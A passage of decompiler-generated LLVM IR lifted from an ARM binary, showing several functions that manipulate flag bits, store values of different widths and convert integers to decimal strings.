  %v1_14404 = and i32 %v3_143f8, 32
  %v2_14404 = icmp eq i32 %v1_14404, 0
  store i1 %v2_14404, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14404, label %dec_label_pc_14434, label %dec_label_pc_1440c

dec_label_pc_1440c:                               ; preds = %dec_label_pc_143e0, %dec_label_pc_143f8
  %v0_1440c = call i32 @function_10a18()
  store i32 %v0_1440c, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_14414 = inttoptr i32 %v0_1440c to i32*
  store i32 9, i32* %v2_14414, align 4
  br label %dec_label_pc_14418

dec_label_pc_14418:                               ; preds = %dec_label_pc_1445c, %dec_label_pc_1440c
  %v0_14418 = load i32, i32* @r4, align 4
  %v1_14418 = inttoptr i32 %v0_14418 to i32*
  %v2_14418 = load i32, i32* %v1_14418, align 4
  %v1_1441c = or i32 %v2_14418, 8
  store i32 %v1_1441c, i32* %r3.global-to-local, align 4
  %v3_14420 = sdiv i32 %v2_14418, 256
  store i32 %v3_14420, i32* @r2, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_14428 = trunc i32 %v3_14420 to i8
  %v3_14428 = add i32 %v0_14418, 1
  %v4_14428 = inttoptr i32 %v3_14428 to i8*
  store i8 %v1_14428, i8* %v4_14428, align 1
  %v0_1442c = load i32, i32* %r3.global-to-local, align 4
  %v1_1442c = trunc i32 %v0_1442c to i8
  %v2_1442c = load i32, i32* @r4, align 4
  %v3_1442c = inttoptr i32 %v2_1442c to i8*
  store i8 %v1_1442c, i8* %v3_1442c, align 1
  %v2_14430 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14430, i32* @r4, align 4
  ret i32 -1

dec_label_pc_14434:                               ; preds = %dec_label_pc_143f8
  %tmp15 = urem i8 %v2_143f8, 4
  %v2_14434 = icmp eq i8 %tmp15, 0
  store i1 %v2_14434, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14434, label %dec_label_pc_14498, label %dec_label_pc_1443c

dec_label_pc_1443c:                               ; preds = %dec_label_pc_14434
  %v1_1443c = and i32 %v3_143f8, 4
  store i32 %v1_1443c, i32* @r1, align 4
  %v2_1443c = icmp eq i32 %v1_1443c, 0
  store i1 %v2_1443c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1443c, label %dec_label_pc_14444, label %dec_label_pc_14474

dec_label_pc_14444:                               ; preds = %dec_label_pc_1443c
  %v1_14444 = add i32 %v0_14444, 20
  %v2_14444 = inttoptr i32 %v1_14444 to i32*
  %v3_14444 = load i32, i32* %v2_14444, align 4
  store i32 %v3_14444, i32* %r2.global-to-local, align 4
  %v1_14448 = add i32 %v0_14444, 16
  %v2_14448 = inttoptr i32 %v1_14448 to i32*
  %v3_14448 = load i32, i32* %v2_14448, align 4
  store i32 %v3_14448, i32* %r3.global-to-local, align 4
  %v9_1444c = icmp eq i32 %v3_14444, %v3_14448
  store i1 %v9_1444c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1444c, label %dec_label_pc_14454, label %dec_label_pc_1445c

dec_label_pc_14454:                               ; preds = %dec_label_pc_14444
  %v1_14454 = and i32 %v3_143f8, 2
  %v2_14454 = icmp eq i32 %v1_14454, 0
  store i1 %v2_14454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14454, label %dec_label_pc_14474, label %dec_label_pc_1445c

dec_label_pc_1445c:                               ; preds = %dec_label_pc_14444, %dec_label_pc_14454
  %v1_1445c = and i32 %v4_14400, 1024
  %v2_1445c = icmp eq i32 %v1_1445c, 0
  store i1 %v2_1445c, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_1445c, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_14468 = call i32 @function_15758()
  store i32 %v0_14468, i32* %r0.global-to-local, align 4
  %v2_1446c = icmp eq i32 %v0_14468, 0
  store i1 %v2_1446c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1446c, label %.dec_label_pc_14474_crit_edge, label %dec_label_pc_14418

.dec_label_pc_14474_crit_edge:                    ; preds = %dec_label_pc_1445c
  %v0_14474.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14474

dec_label_pc_14474:                               ; preds = %.dec_label_pc_14474_crit_edge, %dec_label_pc_1443c, %dec_label_pc_14454
  %v2_14484 = phi i32 [ %v0_14474.pre, %.dec_label_pc_14474_crit_edge ], [ %v0_14444, %dec_label_pc_1443c ], [ %v0_14444, %dec_label_pc_14454 ]
  %v1_14474 = inttoptr i32 %v2_14484 to i32*
  %v2_14474 = load i32, i32* %v1_14474, align 4
  store i32 %v2_14474, i32* %r3.global-to-local, align 4
  %v1_14478 = add i32 %v2_14484, 8
  %v2_14478 = inttoptr i32 %v1_14478 to i32*
  %v3_14478 = load i32, i32* %v2_14478, align 4
  store i32 %v3_14478, i32* %r1.global-to-local, align 4
  %v1_1447c = and i32 %v2_14474, -4
  store i32 %v1_1447c, i32* %r3.global-to-local, align 4
  %v3_14480 = sdiv i32 %v2_14474, 256
  store i32 %v3_14480, i32* %r2.global-to-local, align 4
  %v1_14484 = trunc i32 %v3_14480 to i8
  %v3_14484 = add i32 %v2_14484, 1
  %v4_14484 = inttoptr i32 %v3_14484 to i8*
  store i8 %v1_14484, i8* %v4_14484, align 1
  %v0_14488 = load i32, i32* %r1.global-to-local, align 4
  %v1_14488 = load i32, i32* @r4, align 4
  %v2_14488 = add i32 %v1_14488, 20
  %v3_14488 = inttoptr i32 %v2_14488 to i32*
  store i32 %v0_14488, i32* %v3_14488, align 4
  %v0_1448c = load i32, i32* %r3.global-to-local, align 4
  %v1_1448c = trunc i32 %v0_1448c to i8
  %v2_1448c = load i32, i32* @r4, align 4
  %v3_1448c = inttoptr i32 %v2_1448c to i8*
  store i8 %v1_1448c, i8* %v3_1448c, align 1
  %v0_14490 = load i32, i32* %r1.global-to-local, align 4
  %v1_14490 = load i32, i32* @r4, align 4
  %v2_14490 = add i32 %v1_14490, 24
  %v3_14490 = inttoptr i32 %v2_14490 to i32*
  store i32 %v0_14490, i32* %v3_14490, align 4
  %v0_14494 = load i32, i32* %r1.global-to-local, align 4
  %v1_14494 = load i32, i32* @r4, align 4
  %v2_14494 = add i32 %v1_14494, 16
  %v3_14494 = inttoptr i32 %v2_14494 to i32*
  store i32 %v0_14494, i32* %v3_14494, align 4
  %v0_14498.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14498

dec_label_pc_14498:                               ; preds = %dec_label_pc_14434, %dec_label_pc_14474
  %v2_144a4 = phi i32 [ %v0_14444, %dec_label_pc_14434 ], [ %v0_14498.pre, %dec_label_pc_14474 ]
  %v1_14498 = inttoptr i32 %v2_144a4 to i32*
  %v2_14498 = load i32, i32* %v1_14498, align 4
  %v1_1449c = or i32 %v2_14498, 64
  store i32 %v1_1449c, i32* @r2, align 4
  %v3_144a0 = sdiv i32 %v2_14498, 256
  store i32 %v3_144a0, i32* %r3.global-to-local, align 4
  %v1_144a4 = trunc i32 %v3_144a0 to i8
  %v3_144a4 = add i32 %v2_144a4, 1
  %v4_144a4 = inttoptr i32 %v3_144a4 to i8*
  store i8 %v1_144a4, i8* %v4_144a4, align 1
  %v0_144a8 = load i32, i32* @r4, align 4
  %v1_144a8 = add i32 %v0_144a8, 1
  %v2_144a8 = inttoptr i32 %v1_144a8 to i8*
  %v3_144a8 = load i8, i8* %v2_144a8, align 1
  %v4_144a8 = zext i8 %v3_144a8 to i32
  %v3_144ac = mul nuw nsw i32 %v4_144a8, 256
  store i32 %v3_144ac, i32* %r3.global-to-local, align 4
  %v1_144b0 = and i32 %v3_144ac, 2816
  store i32 %v1_144b0, i32* %r0.global-to-local, align 4
  %v2_144b0 = icmp eq i32 %v1_144b0, 0
  store i1 %v2_144b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_144b0, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_14498
  %v2_144b4 = add i32 %v0_144a8, 12
  %v3_144b4 = inttoptr i32 %v2_144b4 to i32*
  %v4_144b4 = load i32, i32* %v3_144b4, align 4
  store i32 %v4_144b4, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_14498
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_144bc = load i32, i32* @r2, align 4
  %v1_144bc = trunc i32 %v0_144bc to i8
  %v3_144bc = inttoptr i32 %v0_144a8 to i8*
  store i8 %v1_144bc, i8* %v3_144bc, align 1
  %v0_144c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_144c0, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_144c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_144c0 = load i32, i32* @r4, align 4
  %v3_144c0 = add i32 %v2_144c0, 28
  %v4_144c0 = inttoptr i32 %v3_144c0 to i32*
  store i32 %v1_144c0, i32* %v4_144c0, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_144c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_144c4, i32* @r4, align 4
  %v8_144c4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_144c4

; uselistorder directives
  uselistorder i32 %v3_144ac, { 1, 0 }
  uselistorder i32 %v3_144a0, { 1, 0 }
  uselistorder i32 %v3_14480, { 1, 0 }
  uselistorder i32 %v2_14484, { 0, 2, 1 }
  uselistorder i1 %v2_14434, { 1, 0 }
  uselistorder i32 %v3_14420, { 1, 0 }
  uselistorder i32 %v0_14444, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_143ec, { 1, 0 }
  uselistorder i32 %v5_143d0, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 0, 4, 5 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_14498, { 1, 0 }
  uselistorder label %dec_label_pc_14474, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1445c, { 1, 0 }
  uselistorder label %dec_label_pc_1440c, { 1, 0 }
  uselistorder label %dec_label_pc_143f8, { 1, 0 }
}

define i32 @function_144c8() local_unnamed_addr {
dec_label_pc_144c8:
  %v0_144c8 = load i32, i32* @r2, align 4
  %v1_144c8 = icmp slt i32 %v0_144c8, 0
  %v0_144cc = load i32, i32* @r0, align 4
  %v1_144d0 = and i32 %v0_144cc, 2048
  %v2_14504 = icmp eq i32 %v1_144d0, 0
  br i1 %v1_144c8, label %dec_label_pc_14504, label %dec_label_pc_144d8

dec_label_pc_144d8:                               ; preds = %dec_label_pc_144c8
  br i1 %v2_14504, label %dec_label_pc_144e0, label %dec_label_pc_1450c

dec_label_pc_144e0:                               ; preds = %dec_label_pc_144d8
  %v7_144e0 = icmp eq i32 %v0_144cc, 256
  %v0_144e4 = load i32, i32* @r1, align 4
  %v1_144e4 = inttoptr i32 %v0_144e4 to i32*
  %v2_144e4 = load i32, i32* %v1_144e4, align 4
  %v2_144e8 = urem i32 %v2_144e4, 256
  %v2_144e8.v2_144e4 = select i1 %v7_144e0, i32 %v2_144e8, i32 %v2_144e4
  br i1 %v7_144e0, label %.thread, label %dec_label_pc_144f0

dec_label_pc_144f0:                               ; preds = %dec_label_pc_144e0
  %v7_144f0 = icmp eq i32 %v0_144cc, 512
  br i1 %v7_144f0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_144f0
  %v4_144f8 = urem i32 %v2_144e8.v2_144e4, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_144f0, %dec_label_pc_144e0, %bb
  %v1_14500 = phi i32 [ %v2_144e4, %dec_label_pc_144f0 ], [ %v2_144e8, %dec_label_pc_144e0 ], [ %v4_144f8, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_14500

dec_label_pc_14504:                               ; preds = %dec_label_pc_144c8
  br i1 %v2_14504, label %dec_label_pc_14514, label %dec_label_pc_1450c

dec_label_pc_1450c:                               ; preds = %dec_label_pc_144d8, %dec_label_pc_14504
  %v0_1450c = load i32, i32* @r1, align 4
  %v1_1450c = inttoptr i32 %v0_1450c to i32*
  %v2_1450c = load i32, i32* %v1_1450c, align 4
  %v3_1450c = add i32 %v0_1450c, 4
  %v4_1450c = inttoptr i32 %v3_1450c to i32*
  %v5_1450c = load i32, i32* %v4_1450c, align 4
  store i32 %v5_1450c, i32* @r1, align 4
  ret i32 %v2_1450c

dec_label_pc_14514:                               ; preds = %dec_label_pc_14504
  %v7_14514 = icmp eq i32 %v0_144cc, 256
  %v0_14518 = load i32, i32* @r1, align 4
  %v1_14518 = inttoptr i32 %v0_14518 to i32*
  %v2_14518 = load i32, i32* %v1_14518, align 4
  %v2_1451c = urem i32 %v2_14518, 256
  %v2_1451c.v2_14518 = select i1 %v7_14514, i32 %v2_1451c, i32 %v2_14518
  br i1 %v7_14514, label %.thread2, label %dec_label_pc_14524

dec_label_pc_14524:                               ; preds = %dec_label_pc_14514
  %v7_14524 = icmp eq i32 %v0_144cc, 512
  br i1 %v7_14524, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_14524
  %v4_14528 = mul i32 %v2_1451c.v2_14518, 65536
  %v4_1452c = sdiv i32 %v4_14528, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14524, %dec_label_pc_14514, %bb5
  %v0_14530 = phi i32 [ %v2_14518, %dec_label_pc_14524 ], [ %v2_1451c, %dec_label_pc_14514 ], [ %v4_1452c, %bb5 ]
  %v3_14530 = ashr i32 %v0_14530, 31
  store i32 %v3_14530, i32* @r1, align 4
  ret i32 %v0_14530

; uselistorder directives
  uselistorder i32 %v0_14530, { 1, 0 }
  uselistorder i32 %v2_1451c, { 1, 0 }
  uselistorder i32 %v2_14518, { 1, 2, 0 }
  uselistorder i32 %v2_144e8, { 1, 0 }
  uselistorder i32 %v2_144e4, { 1, 2, 0 }
  uselistorder i1 %v2_14504, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1450c, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @function_14538(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14538:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_14538 = icmp eq i32 %arg2, 256
  br i1 %v7_14538, label %dec_label_pc_14564, label %dec_label_pc_14540

dec_label_pc_14540:                               ; preds = %dec_label_pc_14538
  %v7_14540 = icmp eq i32 %arg2, 2048
  br i1 %v7_14540, label %dec_label_pc_14548, label %dec_label_pc_14550

dec_label_pc_14548:                               ; preds = %dec_label_pc_14540
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_14548 = add i32 %tmp2, 4
  %v6_14548 = inttoptr i32 %v5_14548 to i32*
  store i32 %arg4, i32* %v6_14548, align 4
  ret i32 %tmp2

dec_label_pc_14550:                               ; preds = %dec_label_pc_14540
  %v7_14550 = icmp eq i32 %arg2, 512
  br i1 %v7_14550, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_14550
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_14550
  %v4_14554 = sdiv i32 %arg3, 256
  %v1_14560 = trunc i32 %v4_14554 to i8
  %v4_14560 = add i32 %tmp2, 1
  %v5_14560 = inttoptr i32 %v4_14560 to i8*
  store i8 %v1_14560, i8* %v5_14560, align 1
  br label %dec_label_pc_14564

dec_label_pc_14564:                               ; preds = %dec_label_pc_14538, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i32 512, { 3, 4, 5, 6, 1, 7, 0, 2 }
  uselistorder i8* %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14564, { 1, 0 }
}

define i32 @function_1456c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1456c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_14570 = icmp slt i32 %arg4, 0
  %v2_14570 = icmp eq i32 %arg4, 0
  store i1 %v2_14570, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_14570, label %dec_label_pc_14588, label %dec_label_pc_145a8

dec_label_pc_14588:                               ; preds = %dec_label_pc_1456c
  %v1_14588 = icmp slt i32 %arg3, 0
  %v2_14588 = icmp eq i32 %arg3, 0
  store i1 %v2_14588, i1* %cpsr_z.global-to-local, align 1
  %v1_1458c = sub i32 0, %arg4
  store i32 %v1_1458c, i32* %r7.global-to-local, align 4
  br i1 %v1_14588, label %dec_label_pc_14594, label %dec_label_pc_145a8

dec_label_pc_14594:                               ; preds = %dec_label_pc_14588
  %v1_14598 = sub i32 0, %arg2
  store i32 %v1_14598, i32* %r5.global-to-local, align 4
  %v2_14598 = icmp eq i32 %arg2, 0
  %v2_1459c = icmp eq i1 %v2_14598, false
  %v5_1459c = sext i1 %v2_1459c to i32
  %v6_1459c = sub i32 %v5_1459c, %arg3
  store i32 %v6_1459c, i32* %r6.global-to-local, align 4
  %v19_1459c = icmp eq i32 %v6_1459c, 0
  store i1 %v19_1459c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_145b0

dec_label_pc_145a8:                               ; preds = %dec_label_pc_14588, %dec_label_pc_1456c
  br label %dec_label_pc_145b0

dec_label_pc_145b0:                               ; preds = %dec_label_pc_14594, %dec_label_pc_145a8
  %storemerge = phi i8 [ 0, %dec_label_pc_145a8 ], [ 1, %dec_label_pc_14594 ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_145b8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_145b8, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v0_145c0 = call i32 @function_10218()
  store i32 %v0_145c0, i32* %fp.global-to-local, align 4
  %v2_145d0 = call i32 @function_10328(i32 -1, i32 %v0_145b8)
  %v1_145d4 = add i32 %v2_145d0, 1
  store i32 %v1_145d4, i32* %sb.global-to-local, align 4
  %v1_145d8 = load i32, i32* %r7.global-to-local, align 4
  %v9_145d8 = icmp eq i32 %v1_145d4, %v1_145d8
  store i1 %v9_145d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_145d8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_145b0
  %v1_145dc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_145dc, i32* %sb.global-to-local, align 4
  %v1_145e0 = load i32, i32* %fp.global-to-local, align 4
  %v2_145e0 = add i32 %v1_145e0, 1
  store i32 %v2_145e0, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_145b0, %bb
  %v0_145e4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_145e4, i32* %sl.global-to-local, align 4
  %v0_145e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_145e8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_145ec

dec_label_pc_145ecthread-pre-split:               ; preds = %bb19
  %v0_145ec.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_145f4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_145ec

dec_label_pc_145ec:                               ; preds = %dec_label_pc_145ecthread-pre-split, %.thread
  %v0_1465c = phi i32 [ %v0_145f4.pre, %dec_label_pc_145ecthread-pre-split ], [ %v1_145d8, %.thread ]
  %v0_145f0 = phi i32 [ %v0_145ec.pr, %dec_label_pc_145ecthread-pre-split ], [ %v0_145e4, %.thread ]
  %v2_145ec = icmp eq i32 %v0_145f0, 0
  store i1 %v2_145ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_145ec, label %dec_label_pc_14658, label %dec_label_pc_145fc

dec_label_pc_145fc:                               ; preds = %dec_label_pc_145ec
  %v2_145fc = call i32 @function_10328(i32 %v0_145f0, i32 %v0_1465c)
  %v0_14600 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_14600, i32* @r1, align 4
  store i32 %v2_145fc, i32* %r4.global-to-local, align 4
  %v0_14608 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_14608, i32* @r0, align 4
  %v0_1460c = call i32 @function_10218()
  store i32 %v0_1460c, i32* %sl.global-to-local, align 4
  %v0_14618 = load i32, i32* %r6.global-to-local, align 4
  %v2_1461c = call i32 @function_10328(i32 %v0_14618, i32 %v0_14600)
  %v0_14620 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_14620, i32* @r1, align 4
  %v0_14624 = load i32, i32* %r4.global-to-local, align 4
  %v1_14624 = load i32, i32* %sb.global-to-local, align 4
  %v3_14624 = mul i32 %v1_14624, %v0_14624
  %v4_14624 = add i32 %v3_14624, %v2_1461c
  store i32 %v4_14624, i32* %r5.global-to-local, align 4
  %v0_14628 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_14628, i32* @r0, align 4
  %v0_1462c = call i32 @function_10218()
  %v0_14630 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_14630, i32* @r1, align 4
  %v0_14634 = load i32, i32* %fp.global-to-local, align 4
  %v1_14634 = load i32, i32* %r4.global-to-local, align 4
  %v3_14634 = mul i32 %v1_14634, %v0_14634
  %v4_14634 = add i32 %v3_14634, %v0_1462c
  store i32 %v4_14634, i32* %r4.global-to-local, align 4
  %v0_14638 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14638, i32* @r0, align 4
  %v0_1463c = call i32 @function_10218()
  %v0_14640 = load i32, i32* %r7.global-to-local, align 4
  %v2_14644 = add i32 %v4_14634, %v0_1463c
  store i32 %v2_14644, i32* %r6.global-to-local, align 4
  %v2_1464c = call i32 @function_10328(i32 %v0_14638, i32 %v0_14640)
  store i32 %v2_1464c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14678

dec_label_pc_14658:                               ; preds = %dec_label_pc_145ec
  %v0_14658 = load i32, i32* %r6.global-to-local, align 4
  %v2_14660 = call i32 @function_10328(i32 %v0_14658, i32 %v0_1465c)
  %v0_14664 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_14664, i32* @r1, align 4
  store i32 %v2_14660, i32* %r4.global-to-local, align 4
  store i32 %v0_14658, i32* @r0, align 4
  %v0_14670 = call i32 @function_10218()
  store i32 %v0_14670, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14678

dec_label_pc_14678:                               ; preds = %dec_label_pc_145fc, %dec_label_pc_14658
  %v0_14680 = phi i32 [ %v2_1464c, %dec_label_pc_145fc ], [ %v2_14660, %dec_label_pc_14658 ]
  %v3_14678 = load i32, i32* %stack_var_0, align 4
  %v2_1467c = icmp ugt i32 %v0_14680, 8
  %v7_1467c = icmp eq i32 %v0_14680, 9
  store i1 %v7_1467c, i1* %cpsr_z.global-to-local, align 1
  %v1_14684 = add i32 %v0_14680, 48
  %v0_1468c = load i32, i32* %r8.global-to-local, align 4
  %v1_1468c = add i32 %v0_1468c, -1
  store i32 %v1_1468c, i32* %r8.global-to-local, align 4
  %v2_14690 = xor i1 %v7_1467c, true
  %v3_14690 = and i1 %v2_1467c, %v2_14690
  %extract.t = trunc i32 %v1_14684 to i8
  br i1 %v3_14690, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_14678
  %v2_14680 = add i32 %v3_14678, %v0_14680
  %extract.t6 = trunc i32 %v2_14680 to i8
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_14678, %bb18
  %v0_14698.off0 = phi i8 [ %extract.t, %dec_label_pc_14678 ], [ %extract.t6, %bb18 ]
  %v0_14694 = load i32, i32* %r6.global-to-local, align 4
  %v1_14694 = load i32, i32* %sl.global-to-local, align 4
  %v2_14694 = or i32 %v1_14694, %v0_14694
  %v4_14694 = icmp eq i32 %v2_14694, 0
  store i1 %v4_14694, i1* %cpsr_z.global-to-local, align 1
  %v3_14698 = inttoptr i32 %v1_1468c to i8*
  store i8 %v0_14698.off0, i8* %v3_14698, align 1
  %v0_1469c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1469c, label %dec_label_pc_146a0, label %dec_label_pc_145ecthread-pre-split

dec_label_pc_146a0:                               ; preds = %bb19
  %v2_146a0 = load i8, i8* %stack_var_-40, align 1
  %v2_146a4 = icmp eq i8 %v2_146a0, 0
  store i1 %v2_146a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_146a4, label %dec_label_pc_146a0..thread2_crit_edge, label %bb20

dec_label_pc_146a0..thread2_crit_edge:            ; preds = %dec_label_pc_146a0
  %v0_146b0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb20:                                             ; preds = %dec_label_pc_146a0
  %v3_146ac = load i32, i32* %r8.global-to-local, align 4
  %v4_146ac = add i32 %v3_146ac, -1
  %v5_146ac = inttoptr i32 %v4_146ac to i8*
  store i8 45, i8* %v5_146ac, align 1
  %v6_146ac = load i32, i32* %r8.global-to-local, align 4
  %v7_146ac = add i32 %v6_146ac, -1
  store i32 %v7_146ac, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_146a0..thread2_crit_edge, %bb20
  %v0_146b0 = phi i32 [ %v0_146b0.pre, %dec_label_pc_146a0..thread2_crit_edge ], [ %v7_146ac, %bb20 ]
  ret i32 %v0_146b0

; uselistorder directives
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 0, 9 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 5, 2, 3, 4, 6, 8, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_14678, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_145b0, { 1, 0 }
}

define i32 @function_146bc(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_146bc:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-42 = alloca i8, align 1
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-43 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-78 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_146bc = load i32, i32* @r4, align 4
  store i32 %v3_146bc, i32* %stack_var_-36, align 4
  %v6_146bc = load i32, i32* @r5, align 4
  %v9_146bc = load i32, i32* @r6, align 4
  %v12_146bc = load i32, i32* @r7, align 4
  %v15_146bc = load i32, i32* @r8, align 4
  %v18_146bc = load i32, i32* @sb, align 4
  %v21_146bc = load i32, i32* @sl, align 4
  %v1_146c0 = add i32 %tmp, 8
